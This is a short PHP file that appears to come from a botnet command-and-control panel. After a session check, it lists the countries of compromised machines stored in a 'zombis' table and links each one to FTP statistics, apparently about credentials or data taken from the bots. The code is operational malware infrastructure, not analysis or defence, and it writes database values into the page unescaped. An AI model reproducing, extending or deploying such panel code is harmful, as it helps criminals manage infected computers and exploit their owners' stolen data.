<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php
require_once('../../includes.php');
$Pais = $DB->Select("SELECT DISTINCT pais FROM zombis WHERE pais!=''");

for($i=0; $i<count($Pais); $i++){
$Paises .= '<option value="'.$Pais[$i]['pais'].'" onclick="Estadisticasftp(\''.$Pais[$i]['pais'].'\')">'.$Pais[$i]['pais'].'</option>' ;
}

$Vacio = $DB->Select("SELECT * FROM zombis WHERE pais IS NULL");
if( count($Vacio) > 0 ){
	$Paises .= '<option value="" onclick="Estadisticasftp(\'\')">Unknown</option>' ;
}


?>
<select name="pais" id="pais" size="1" style="color: #666666; font-size: 8pt; font-family: Tahoma; border: 1px solid #000000; background-color: #000000">
  <option selected="selected">Seleccione un Pais</option>
  <?php echo $Paises ; ?>
</select>